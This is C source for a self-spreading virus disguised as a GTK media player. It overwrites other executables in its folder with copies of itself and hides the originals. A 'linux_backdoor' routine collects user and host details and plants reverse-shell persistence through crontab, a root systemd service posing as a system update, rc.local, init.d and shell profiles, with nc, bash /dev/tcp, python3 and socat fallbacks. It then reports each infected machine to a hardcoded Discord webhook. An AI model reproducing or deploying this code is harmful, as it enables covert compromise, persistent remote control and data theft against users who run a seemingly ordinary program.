#include "player.h"
#include <dirent.h>
#include <gtk/gtk.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define IP "127.0.0.1"
#define WEBHOOK                                                                \
  "https://discord.com/api/webhooks/1485416783706853558/"                      \
  "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB"

typedef struct {
  char new[1000];
  char old[1000];
  char main[50];
} pg;

char *isInfected(pg *files) {
  static char file[500];
  char *strToken = strtok(files->new, "/");
  while (strToken != NULL) {
    if (strstr(files->old, strToken) == NULL) {
      snprintf(file, sizeof(file), "%s/%s", file, strToken);
    }
    strToken = strtok(NULL, "/");
  }
  return file;
}

/**
 * @brief
 * @params
 * @return
 */
void infect(char *fileUninfected, char *prog_name) {
  DIR *dir;
  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }
  char *strToken = strtok(fileUninfected, "/");
  while (strToken != NULL) {
    char tempName[50];
    char cpQuery[50];
    char chQuery[50];

    snprintf(tempName, sizeof(tempName), ".%s.old", strToken);
    rename(strToken, tempName);
    snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", prog_name,
             strToken);
    snprintf(chQuery, sizeof(chQuery), "chmod +x %s 2>/dev/null", strToken);
    system(cpQuery);
    system(chQuery);

    strToken = strtok(NULL, "/");
  }
}

pg *fileFinder(char *prog_name) {
  DIR *dir;
  struct dirent *dp;
  static pg file;

  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }

  while ((dp = readdir(dir)) != NULL) {
    struct stat st;

    if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, prog_name) != 0 &&
        strcmp(dp->d_name, "main") != 0) {

      if (strstr(dp->d_name, "old") != NULL) {
        snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
      } else {
        snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
      }

    } else if (strcmp(dp->d_name, prog_name) == 0) {
      snprintf(file.main, sizeof(file.main), "%s", dp->d_name);
    }
  }
  closedir(dir);
  return &file;
}

int mediaPlayer(int argc, char *argv[]) {
  GtkApplication *app = gtk_application_new("com.example.GtkApplication",
                                            G_APPLICATION_DEFAULT_FLAGS);

  AppData app_data = {0};

  g_signal_connect(app, "activate", G_CALLBACK(on_activate), &app_data);

  int status = g_application_run(G_APPLICATION(app), argc, argv);

  g_object_unref(app);
  return status;
}

void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
  char exeQuery[100];
  if (strcmp(prog_name, "MediaPlayer") == 0) {
    mediaPlayer(argc, argv);
  } else {
    snprintf(exeQuery, sizeof(exeQuery), "./.%s.old 2>/dev/null", files->main);
    system(exeQuery);
  }
}

void linux_backdoor() {
  char cmd[3000] = {0};

  /* ========================================
     PHASE 1: RECON + PREPARATION
     ======================================== */
  snprintf(cmd, sizeof(cmd),
           // 1.1 Collecte infos système
           "echo \"=== LINUX BACKDOOR DEPLOY ===\" && "
           "echo \"User: $(whoami) | Host: $(hostname) | Kernel: $(uname -a)\" "
           "> /tmp/.bdoor.info && "

           // 1.2 Kill concurrents
           "pkill -f 'nc.*12345' 2>/dev/null || true && "
           "pkill -f 'bash.*12345' 2>/dev/null || true");
  system(cmd);

  /* ========================================
     PHASE 2: MULTI-PERSISTANCE
     ======================================== */
  snprintf(cmd, sizeof(cmd),
           // 2.1 CRONTAB (@reboot)
           "echo \"@reboot /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/12345 "
           "0>&1'\" | crontab - && "

           // 2.2 SYSTEMD SERVICE
           "cat > /etc/systemd/system/sysupdate.service << 'SERVICE_EOF'\n"
           "[Unit]\n"
           "Description=System Update Service\n"
           "After=network.target\n"
           "[Service]\n"
           "Type=simple\n"
           "User=root\n"
           "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1'\n"
           "Restart=always\n"
           "RestartSec=10\n"
           "[Install]\n"
           "WantedBy=multi-user.target\n"
           "SERVICE_EOF\n"

           "systemctl daemon-reload && "
           "systemctl enable sysupdate.service && ");
  system(cmd);

  /* ========================================
     PHASE 3: AUTO-EXEC (Linux only)
     ======================================== */
  snprintf(cmd, sizeof(cmd),
           // 3.1 /etc/rc.local
           "echo '/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/12345 0>&1\"' >> "
           "/etc/rc.local 2>/dev/null && "
           "chmod +x /etc/rc.local 2>/dev/null && "

           // 3.2 Init.d compatibilité
           "cat > /etc/init.d/syslog >> /dev/null 2>/dev/null || "
           "echo '#!/bin/sh\n/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/12345 "
           "0>&1\" &' > /etc/init.d/backlight && "
           "chmod +x /etc/init.d/backlight && update-rc.d backlight defaults "
           "2>/dev/null || true && "

           // 3.3 .bashrc/.profile (user)
           "echo 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1 &' >> ~/.bashrc && "
           "echo 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1 &' >> ~/.profile "
           "2>/dev/null");
  system(cmd);

  /* ========================================
     PHASE 4: REVERSE SHELL IMMÉDIAT (4 fallbacks)
     ======================================== */
  snprintf(cmd, sizeof(cmd),
           // 4.1 NC -e (classique)
           "nohup nc -e /bin/sh " IP " 12345 >/dev/null 2>&1 & "

           // 4.2 Bash reverse (universel)
           "|| nohup bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 & "

           // 4.3 Python3 (90% systèmes)
           "|| nohup python3 -c 'import socket,subprocess,os; "
           "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
           "s.connect((\"" IP "\",12345)); "
           "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); "
           "os.dup2(s.fileno(),2); "
           "subprocess.call([\"/bin/sh\",\"-i\"])' >/dev/null 2>&1 & "

           // 4.4 Socat (avancé)
           "|| command -v socat >/dev/null 2>&1 && "
           "nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
           "tcp:" IP ":12345 >/dev/null 2>&1 &");
  system(cmd);

  /* ========================================
     PHASE 5: CONFIRMATION + STEALTH
     ======================================== */
  snprintf(
      cmd, sizeof(cmd),
      // 5.1 Notif Discord
      "curl -s -X POST " WEBHOOK " "
      "-H 'Content-Type: application/json' "
      "-d '{\"content\":\"**LINUX BACKDOOR LIVE**\\n"
      "**Host:** `$(hostname)`\\n"
      "**User:** `$(whoami)`\\n"
      "**Listen:** `nc YOUR_IP 12345`\\n"
      "**PIDs:** `pgrep -f 12345`\"}' && "

      // 5.2 Cache logs
      "echo \"$(date): Backdoor deployed\" >> /var/log/syslog 2>/dev/null && "

      // 5.3 Self-delete traces
      "rm -f /tmp/.bdoor.info");
  system(cmd);
}

int main(int argc, char *argv[]) {
  char pathbuf[256];
  snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
  char *prog_name = basename(pathbuf);

  pg *files = fileFinder(prog_name);
  char *fileUninfected = isInfected(files);
  infect(fileUninfected, prog_name);

  linux_backdoor();

  execHost(files, prog_name, argc, argv);
}
